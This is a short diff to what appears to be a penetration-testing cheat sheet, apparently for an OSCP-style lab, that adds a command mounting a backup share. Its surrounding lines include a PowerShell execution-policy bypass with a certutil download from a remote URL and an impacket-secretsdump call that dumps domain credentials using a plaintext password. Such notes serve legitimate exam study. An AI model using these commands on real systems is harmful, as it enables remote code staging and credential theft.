@@ -24,6 +24,10 @@ powershell -ep bypass; cd C:\Windows\Tasks; certutil -urlcache -split -f http://
 ```
 
 ```
+sudo mount -t cifs \\192.168.123.111\Backups /mnt/share
+```
+
+```
 impacket-secretsdump 'oscp.exam/u.gregory:GregsNewBrand551@DC20.OSCP.EXAM' -just-dc
 ```
 
